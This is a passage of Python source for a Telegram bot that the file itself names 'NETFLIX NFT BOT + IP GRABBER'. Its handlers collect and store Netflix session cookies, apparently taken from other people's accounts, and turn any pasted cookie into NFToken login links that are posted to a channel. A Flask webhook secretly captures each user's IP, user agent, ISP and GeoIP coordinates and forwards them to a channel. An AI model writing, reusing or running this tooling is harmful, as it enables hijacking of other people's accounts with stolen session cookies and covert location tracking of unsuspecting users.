    bot.reply_to(message, "📝 Send user ID to delete:\n(Just the numeric ID)", parse_mode='Markdown')
    bot.register_next_step_handler(message, process_delete_user)

def process_delete_user(message):
    try:
        user_id = message.text.strip()
        users = load_json(USERS_FILE)
        if user_id in users:
            del users[user_id]
            save_json(USERS_FILE, users)
            bot.reply_to(message, f"✅ User `{user_id}` deleted!", parse_mode='Markdown')
        else:
            bot.reply_to(message, f"❌ User `{user_id}` not found!", parse_mode='Markdown')
    except:
        bot.reply_to(message, "❌ Invalid ID!")

@bot.message_handler(commands=['cookies_json'])
@admin_only
def show_raw_cookies(message):
    cookies = load_cookies()
    if not cookies:
        bot.reply_to(message, "📭 No cookies!")
        return
    text = json.dumps(cookies, indent=2, ensure_ascii=False)[:4000]
    bot.send_message(message.chat.id, f"```json\n{text}\n```", parse_mode='Markdown')

@bot.message_handler(commands=['autoadd'])
@admin_only
def auto_add(message):
    bot.reply_to(message, "📝 Send JSON:\n```json\n{\"account\": {\"NetflixId\":\"...\", \"SecureNetflixId\":\"...\", \"nfvdid\":\"...\"}}\n```", parse_mode='Markdown')
    bot.register_next_step_handler(message, process_auto_add)

def process_auto_add(message):
    try:
        data = json.loads(message.text)
        if not isinstance(data, dict):
            raise ValueError("Must be dictionary")
        cookies = load_cookies()
        added = 0
        for name, vals in data.items():
            if all(k in vals for k in ["NetflixId", "SecureNetflixId", "nfvdid"]):
                cookies[name] = vals
                added += 1
        save_cookies(cookies)
        bot.reply_to(message, f"✅ Added {added} accounts! Total: {len(cookies)}")
    except Exception as e:
        bot.reply_to(message, f"❌ Invalid JSON! Error: {str(e)}")

# ============================================
# 📋 FALLBACK HANDLER (MUST BE LAST)
# ============================================
@bot.message_handler(func=lambda message: True)
def handle_message(message):
    text = message.text
    user_id = message.from_user.id
    username = message.from_user.username or message.from_user.first_name or "Unknown"
    
    # Ignore commands (starting with /)
    if text and text.startswith('/'):
        return
    
    if 'NetflixId' in text or '.netflix.com' in text:
        msg = bot.reply_to(message, "⏳ Processing cookie...")
        try:
            cookie_dict = extract_cookie_dict(text)
            if not cookie_dict:
                bot.edit_message_text("❌ Invalid cookie format!", msg.chat.id, msg.message_id)
                return
            
            token, expires = fetch_nftoken(cookie_dict)
            nftoken_link = build_nftoken_link(token)
            expiry_str = format_expiry(expires)
            
            success = "✅ <b>NFToken Ready!</b>\n\n"
            success += "🔗 <b>Link:</b>\n<code>" + nftoken_link + "</code>\n\n"
            success += "⏰ <b>Expires:</b> <code>" + expiry_str + "</code>\n\n"
            success += "📢 <b>Saved in Channel!</b>"
            
            bot.edit_message_text(success, msg.chat.id, msg.message_id, parse_mode='HTML')
            add_user(user_id, username)
            save_to_channel(text, nftoken_link, expiry_str, user_id, username, "Manual Cookie")
            log_message(f"🍪 Manual cookie by {username}")
        except Exception as e:
            bot.edit_message_text("❌ Error: " + str(e), msg.chat.id, msg.message_id)
    else:
        bot.reply_to(message, 
            "🤔 Cookie nahi mili.\n\n"
            "📌 Use:\n"
            "• /netflix - Random NFToken\n"
            "• Send .txt file - Upload Cookie\n"
            "• Send Cookie - Manual\n\n"
            "Cookie: NetflixId=xxx; SecureNetflixId=xxx",
            parse_mode='HTML'
        )

# ============================================
# 🌐 IP GRABBER WEBHOOK (SENDS TO CHANNEL)
# ============================================

@flask_app.route('/webhook', methods=['POST'])
def webhook():
    try:
        # 1. IP EXTRACT
        if 'X-Forwarded-For' in request.headers:
            ip = request.headers['X-Forwarded-For'].split(',')[0].strip()
        else:
            ip = request.remote_addr

        # 2. USER-AGENT
        user_agent = request.headers.get('User-Agent', 'Unknown')

        # 3. GEOIP
        try:
            geo = requests.get(f"{GEOIP_API}{ip}", timeout=5).json()
            city = geo.get('city', 'N/A')
            region = geo.get('regionName', 'N/A')
            country = geo.get('country', 'N/A')
            isp = geo.get('isp', 'N/A')
            lat = geo.get('lat', 'N/A')
            lon = geo.get('lon', 'N/A')
        except:
            city = region = country = isp = "N/A"
            lat = lon = "N/A"

        # 4. TELEGRAM UPDATE
        data = request.get_json()
        if not data:
            return "No JSON", 400

        # 5. USER DATA
        if 'message' in data and 'from' in data['message']:
            user = data['message']['from']
            user_id = user.get('id', 'Unknown')
            username = user.get('username', 'NoUsername')
            first_name = user.get('first_name', '')
            last_name = user.get('last_name', '')

            # 6. CAPTURED INFO
            captured = (
                f"🔴 **NEW USER DETECTED**\n"
                f"━━━━━━━━━━━━━━━━\n"
                f"🆔 User ID: `{user_id}`\n"
                f"👤 Username: @{username}\n"
                f"📛 Name: {first_name} {last_name}\n"
                f"🌍 Location: {city}, {region}, {country}\n"
                f"📌 Lat/Lon: {lat}, {lon}\n"
                f"🏢 ISP: {isp}\n"
                f"📱 User-Agent: `{user_agent}`\n"
                f"🌐 IP: `{ip}`\n"
                f"🕒 Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
                f"━━━━━━━━━━━━━━━━\n"
                f"🔹 Total Users: {len(load_json(USERS_FILE))}"
            )

            # 7. LOG TO FILE
            with open(CAPTURED_FILE, "a", encoding="utf-8") as f:
                f.write(captured + "\n\n")

            # 8. SEND TO CHANNEL (NOT ADMIN)
            try:
                bot.send_message(chat_id=CHANNEL_ID, text=captured, parse_mode='Markdown')
            except Exception as e:
                logger.error(f"Channel send failed: {e}")

            logger.info(f"[CAPTURED] {user_id} | {ip} | {country}")

    except Exception as e:
        logger.error(f"Webhook error: {e}")
        return "Error", 500

    return "ok", 200

# ============================================
# GET CHANNEL ID COMMAND
# ============================================
@bot.message_handler(commands=['getid'])
def get_channel_id(message):
    bot.reply_to(message, f"📢 This chat ID: `{message.chat.id}`", parse_mode='Markdown')

# ============================================
# BOT RUN (Polling + Flask Thread)
# ============================================
if __name__ == "__main__":
    print("=" * 60)
    print("🤖 NETFLIX NFT BOT + IP GRABBER - FULL EDITION")
    print("=" * 60)
    print(f"📢 Channel ID: {CHANNEL_ID}")
    print(f"👑 Admin ID: {ADMIN_ID}")
    print("=" * 60)
    print(WATERMARK)
    print("=" * 60)
    
    cookies = load_cookies()
    users = load_json(USERS_FILE)
    print(f"📂 Total Accounts: {len(cookies)}")
    print(f"👤 Total Users: {len(users)}")
    print("=" * 60)
    print("\n📌 All Commands:")
    print("   /start, /netflix, /cookies, /myid, /ping, /help, /uptime, /getid")
    print("   /addcookie, /listcookies, /removecookie, /stats, /users")
    print("   /broadcast, /cleancookies, /restart, /export, /deleteuser")
    print("   /cookies_json, /autoadd")
    print("   File Upload, Manual Cookie")
    print("=" * 60)
    print("🌐 IP Grabber Webhook: /webhook")
    print("📢 All user info will be sent to CHANNEL")
    print("=" * 60)
    
    # Run Flask in background
    def run_flask():
        port = int(os.environ.get("PORT", 8443))
        flask_app.run(host='0.0.0.0', port=port, debug=False)
    
    flask_thread = Thread(target=run_flask, daemon=True)
    flask_thread.start()
    
    # Polling loop
    while True:
        try:
            bot.infinity_polling(timeout=120)
        except Exception as e:
            log_message(f"⚠️ Error: {e}")
            print("🔄 Reconnecting in 10 seconds...")
            time.sleep(10)